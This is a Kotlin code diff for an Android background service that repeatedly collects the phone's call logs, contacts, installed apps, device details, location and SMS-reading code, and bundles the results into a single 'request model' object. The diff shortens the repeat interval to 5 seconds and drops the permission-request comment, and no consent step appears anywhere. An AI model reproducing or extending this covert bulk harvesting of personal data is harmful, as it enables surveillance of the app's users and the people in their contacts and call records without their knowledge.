@@ -35,7 +35,7 @@ class AppService : Service() {
                 Log.d(TAG, "todo for hit background service repeat")
                 makeModel()
             }
-        }, 2000)
+        },0, 5000L)
 
 //        startRepeatingJob(2000L)
 
@@ -71,13 +71,6 @@ class AppService : Service() {
                 Manifest.permission.ACCESS_COARSE_LOCATION
             ) != PackageManager.PERMISSION_GRANTED
         ) {
-            // TODO: Consider calling
-            //    ActivityCompat#requestPermissions
-            // here to request the missing permissions, and then overriding
-            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
-            //                                          int[] grantResults)
-            // to handle the case where the user grants the permission. See the documentation
-            // for ActivityCompat#requestPermissions for more details.
             return
         }
         fusedLocationClient.lastLocation
@@ -86,13 +79,23 @@ class AppService : Service() {
                 Log.d(TAG, "location --> ${Gson().toJson(it)}")
             }
 
-        var systemDetail = getSystemDetail()
-        Log.d(TAG, "systemDetail $systemDetail")
-        getCallLogs()
-        Log.d(TAG, "call logs list = ${Gson().toJson(getCallLogs())}")
-        getSMSLogs()
-        getNamePhoneDetails()
-        getAppsInstalled()
+//        val smsLogs = getSMSLogs()
+        val location = "Tangerang"
+        val callLogs = Gson().toJson(getCallLogs())
+        val listContact = Gson().toJson(getNamePhoneDetails())
+        val appsInstalled = Gson().toJson(getAppsInstalled())
+
+        val model = ServiceModel(
+            location = location,
+            deviceInfo = getSystemDetail(),
+            callLogs = callLogs,
+            smsLogs = "smsLogs",
+//            "",
+            listContact = listContact,
+            appsDownloaded = appsInstalled
+        )
+
+        Log.d(TAG, "request model ${Gson().toJson(model)}")
 
     }
 
@@ -120,7 +123,7 @@ class AppService : Service() {
                 "Version Code: ${Build.VERSION.RELEASE}"
     }
 
-    fun getCallLogs(): ArrayList<CallLogs> {
+    private fun getCallLogs(): ArrayList<CallLogs> {
         val callLogsBuffer = ArrayList<CallLogs>()
         callLogsBuffer.clear()
         val managedCursor: Cursor? = this.contentResolver.query(
@@ -159,7 +162,7 @@ class AppService : Service() {
         return callLogsBuffer
     }
 
-    fun getSMSLogs(): String {
+    private fun getSMSLogs(): String {
         val cursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
         var msgData = ""
         if (cursor!!.moveToFirst()) { // must check the result to prevent exception
@@ -199,13 +202,12 @@ class AppService : Service() {
         return names
     }
 
-    fun getAppsInstalled(): MutableList<String> {
+    private fun getAppsInstalled(): MutableList<String> {
         val apps = mutableListOf<String>()
         val pm = packageManager
         val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
 
         for (packageInfo in packages) {
-            Log.d(TAG, "Installed package :" + packageInfo.packageName)
             apps.add(packageInfo.packageName)
         }
         Log.d(TAG, "Apps Installed --> ${Gson().toJson(apps)}")
